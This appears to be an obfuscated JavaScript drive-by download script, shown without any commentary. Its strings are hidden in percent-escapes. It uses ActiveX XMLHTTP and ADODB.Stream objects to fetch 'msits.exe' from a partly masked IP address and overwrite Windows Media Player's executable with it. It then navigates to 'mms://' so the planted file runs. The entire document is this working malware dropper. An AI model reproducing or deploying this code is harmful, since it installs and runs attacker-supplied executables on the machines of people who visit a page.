
var szExt = unescape("%2E%65%78%65");
var szM = unescape("%6D");
var szMMS = szM + szM + "s://";
var szSTR=  unescape("%53%74%72%65%61%6D");
var szADO    = unescape("%41%44%4F%44%42%2E")    + szSTR;
var szMS = "Microsoft"; var szWIN = unescape("%57%69%6E%64%6F%77%73");
var szHTTP = szMS + unescape("%2E%58%4D%4C%48%54%54%50");
var HTTP  =  new ActiveXObject(szHTTP); var METHOD =
unescape("%47%45%54");
var xx1=unescape("%4D%65%64%69%61"); var xx2 =
unescape("%50%6C%61%79%65%72");
var MP1=unescape("%43%3A%5C%5C%50%72%6F%67%72%61%6D"); var MP2 = " " + xx1
+ " " + xx2;
var szPL = "pl";
var MP = MP1 + " Files\\" + szWIN + MP2 + "\\wm" + szPL +
unescape("%61%79%65%72") + szExt;
var szURL = "http://217.107.218.***/msits.exe";
var i = 8 - 5;
var t = 7 - 6; HTTP.Open(METHOD, szURL, i-3); HTTP.Send();
var ADO = new ActiveXObject(szADO);
ADO.Mode = i; ADO.Type = t;
ADO.Open(); ADO.Write(HTTP.responseBody);
ADO.SaveToFile(MP, i-t); location.href=szMMS;